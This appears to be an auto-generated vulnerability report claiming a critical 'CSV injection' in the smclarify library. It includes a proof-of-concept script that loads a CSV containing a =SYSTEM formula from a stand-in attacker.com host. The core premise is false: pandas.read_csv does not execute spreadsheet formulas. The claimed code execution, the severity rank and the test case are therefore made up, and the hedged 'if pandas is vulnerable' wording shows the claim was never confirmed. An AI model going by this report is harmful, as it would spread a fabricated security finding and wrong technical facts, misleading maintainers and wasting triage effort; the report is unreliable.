- Vulnerability Name: CSV Injection in Dataset Loading
- Description:
  - An attacker crafts a malicious CSV file containing formulas (e.g., `=SYSTEM("malicious_command")`).
  - The attacker hosts this malicious CSV file on a public S3 bucket or a web server.
  - A user, intending to use `smclarify` for bias analysis, is tricked or unknowingly uses a dataset path pointing to the attacker's malicious CSV file.
  - The `smclarify` library, through its `Datasets` class and `S3Dataset` module, uses `pandas.read_csv` to load the dataset from the provided path.
  - If the pandas library version used by `smclarify` is vulnerable to CSV injection, `pandas.read_csv` executes the malicious formulas embedded in the CSV during parsing.
  - This results in arbitrary code execution on the user's system with the privileges of the user running `smclarify`.
- Impact:
  - Arbitrary code execution. An attacker can potentially gain full control over the user's system, leading to data breaches, malware installation, or denial of service.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
  - None. The code directly uses `pandas.read_csv` and `pd.read_parquet` without any input sanitization or security configurations.
- Missing Mitigations:
  - Input Sanitization: Implement sanitization of datasets before parsing with pandas, specifically neutralizing or removing potentially malicious content like CSV formulas.
  - Secure Parsing Configuration: Configure `pandas.read_csv` to disable features that could lead to code injection, such as formula execution, if pandas provides such options.
  - Sandboxing/Isolation: Execute dataset loading and analysis within a sandboxed environment or container to limit the impact of any code execution vulnerability.
  - Input Validation: Implement checks to validate the source and integrity of datasets, ensuring they are loaded only from trusted and verified origins.
- Preconditions:
  - Attacker has the ability to host a malicious CSV file at an accessible location (e.g., public web server, S3 bucket).
  - User uses `smclarify` to load a dataset, and the provided path inadvertently or intentionally points to the attacker's malicious CSV file.
  - The version of the pandas library used by `smclarify` is susceptible to CSV injection or a similar vulnerability.
- Source Code Analysis:
  - File: `/code/src/smclarify/util/dataset.py`
    ```python
    class S3Dataset(S3CachedDatasetMixin, Dataset):
        ...
        def read_csv_data(self, index_col=False) -> pd.DataFrame:
            self.ensure_local()
            return pd.read_csv(self.local_path(), index_col=index_col)
    ```
    - The `S3Dataset.read_csv_data` function directly utilizes `pandas.read_csv` to load data. The `self.local_path()` method determines the file path, which, if derived from a malicious source URL controlled by an attacker, can lead to loading a malicious CSV file.
    - If `pandas.read_csv` is vulnerable to CSV injection, parsing a malicious CSV through this code will trigger the vulnerability.
- Security Test Case:
  1. Create a malicious CSV file named `malicious.csv` with the following content to test for command execution:
     ```csv
     Column1,Column2
     test,=SYSTEM("touch /tmp/smclarify_pwned")
     ```
  2. Host `malicious.csv` on a publicly accessible web server. For example, using Python's `http.server`:
     ```bash
     python3 -m http.server 8000
     ```
     Assume the server is running on `attacker.com` and the file is accessible at `http://attacker.com:8000/malicious.csv`.
  3. Create a Python script to load the malicious CSV using a modified `Datasets` class within `smclarify`:
     ```python
     import smclarify
     import pandas as pd
     import os

     class MaliciousDataset(smclarify.util.dataset.Dataset):  # Corrected base class
         def __init__(self, id, source, description):
             super().__init__(id, source, description)
         def ensure_local(self) -> None:
             pass
         def train(self) -> pd.DataFrame:
             return pd.DataFrame()
         def read_csv_data(self, index_col=False) -> pd.DataFrame:
             return pd.read_csv(self.source, index_col=index_col)


     datasets_instance = smclarify.util.dataset.Datasets()
     datasets_instance.datasets["malicious_dataset"] = MaliciousDataset(
         "malicious_dataset",
         "http://attacker.com:8000/malicious.csv", # Use your attacker's host and port
         "Malicious Dataset for CSV injection test",
     )

     try:
         df = datasets_instance("malicious_dataset").read_csv_data()
         print("CSV loaded successfully (unexpected if vulnerable):")
         print(df)
     except Exception as e:
         print(f"Error loading CSV (expected if vulnerable or pandas patched): {e}")

     if os.path.exists("/tmp/smclarify_pwned"):
         print("VULNERABILITY CONFIRMED: /tmp/smclarify_pwned file created, indicating code execution!")
         os.remove("/tmp/smclarify_pwned") # Cleanup for repeated tests
     else:
         print("Vulnerability NOT confirmed: /tmp/smclarify_pwned file NOT created (pandas might be patched or not vulnerable).")
     ```
  4. Run the Python script in an environment where `smclarify` and a potentially vulnerable version of pandas are installed.
  5. Check if the file `/tmp/smclarify_pwned` has been created. If the file exists, it confirms that the CSV injection vulnerability was successfully exploited, leading to command execution. If not, pandas might be patched, or the system might have security features preventing the command execution.